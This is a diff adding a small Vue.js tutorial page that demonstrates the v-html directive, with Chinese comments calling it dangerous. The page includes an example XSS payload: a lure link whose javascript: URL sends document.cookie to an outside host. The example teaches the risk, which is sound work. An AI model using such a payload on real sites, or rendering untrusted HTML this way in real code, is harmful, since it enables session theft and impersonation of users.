@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-html指令</title>
+    <script src="../js/vue.js">
+    </script>
+</head>
+<body>
+    <div id="root">
+        <div>你好， {{name}}</div>
+        <!-- v-html替换div中内容，可以解析标签 -->
+        <div v-html="name"></div>
+        <!-- 危险！！！ -->
+        <div v-html="str"></div>
+    </div>
+
+    <script>
+        Vue.config.productionTip = false
+
+        new Vue({
+            el: "#root",
+            data:{
+                name: '<h1>llf</h1>',
+                // XSS 攻击： 使用cookie冒充身份
+                str: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点击领取资源</a>'
+            },
+            methods:{
+
+            }
+        })
+    </script>
+</body>
+</html>
